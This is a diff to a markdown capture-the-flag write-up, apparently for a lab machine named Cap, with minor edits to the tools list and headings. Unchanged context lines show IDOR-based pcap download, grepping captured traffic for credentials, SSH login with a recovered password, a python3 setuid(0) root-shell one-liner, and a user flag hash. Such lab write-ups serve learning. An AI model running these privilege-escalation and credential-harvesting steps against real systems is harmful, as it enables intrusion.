@@ -38,7 +38,7 @@ image: https://i.ytimg.com/vi/O_z6o2xuvlw/maxresdefault.jpg?sqp=-oaymwEmCIAKENAF
 - Practicing **IDOR exploitation**
 - Leveraging **Linux capabilities** for privilege escalation
 ## Tools Used
-- rustscan; nmap; gobuster; Wireshark
+- rustscan; nmap; gobuster; Wireshark or tcpdump
 ---
 # Environment Setup
 - After connected to openvpn
@@ -187,9 +187,6 @@ nmap -sU --top-ports 200 -oN udp_scan.txt 10.10.10.245
 - 21/tcp: FTP (vsftpd 3.0.3) - Anonymous login disabled
 - 22/tcp: SSH (OpenSSH 8.2p1 Ubuntu)
 - 80/tcp: HTTP ( gunicorn)
-### **Key Findings**
-
-- No immediate vulnerabilities identified on FTP or SSH.
 ---
 # Enumeration
 ## Port 21 - FTP (vsftpd 3.0.3)
@@ -232,7 +229,6 @@ curl http://10.10.10.245/data/0 -o data_0.pcap
 ```
   
   - Analyzed the PCAP file using **Wireshark** or **tcpdump** and extracted credentials:
-
 #### wireshark Method
 ```sh title:wireshark
 wireshark 0.pcap
@@ -252,6 +248,7 @@ sshpass -p Buck3tH4TF0RM3! ssh nathan@10.10.10.245 -p 22
 sudo tcpdump -r 0.pcap -A | grep -Ei "USER|PASS"
 ```
 ![](<./attachments/Cap-4.png>)
+
 ---
 # Privilege Escalation to Root
 
@@ -288,7 +285,7 @@ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 
 - This spawned a root shell, granting full administrative access.
 ---
-# Flags
+# Trophies
 ## User Flag
 ```txt
 eb5664f19ed353f783de12dc9e75647a
